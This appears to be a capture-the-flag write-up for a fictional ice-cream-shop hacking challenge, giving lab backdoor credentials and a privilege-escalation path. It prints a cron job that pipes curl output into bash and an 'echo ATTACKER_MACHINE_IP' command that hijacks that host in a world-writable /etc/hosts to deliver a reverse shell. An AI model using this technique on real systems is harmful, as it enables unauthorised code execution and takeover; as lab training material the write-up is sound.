---
layout: post
author: d3r3lict
tags: [idk, idk, idk]
---
# The story
The vigilante hacker and Vim enthusiast has enlisted you for help! He's been tipped off that the enigmatic ice cream shop owner Chad Cherry and his creamy crew are up to something nefarious: they plan to use their totally legit business to rid the world of the greatest text editor, Vim, and replace it with their preferred editor Nano! You'll need to hack into the ice cream shop and escalate your privileges to take them down! Jex has already gained initial access and has created a backdoor account to help you out.

# Initial access
Jex has set up a backdoor account for you to use to get started.

```
Username: notsus
Password: dontbeascriptkiddie
```
# Priv esc
First of all I used linpeas to enumerate the target, and I've noticed this in crontab.

```
*  *    * * *   bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
```

There wasn't such host in /etc/hosts, so maybe we can add it and point it to the attacking machine?
```
$ ls -al /etc/hosts
-rw-rw-rw- 1 root adm 312 Apr  8  2023 /etc/hosts
```
Yup, we can. Run `echo ATTACKER_MACHINE_IP cherryontop.tld >> /etc/hosts`.
Now recreate exactly the same directories and put your reverse shell payload into coinflip.sh file. 
After a while we got the shell, nice. From here we can get third part of Chad Cherry's password.

Let's do some shell stabilisation and move further.
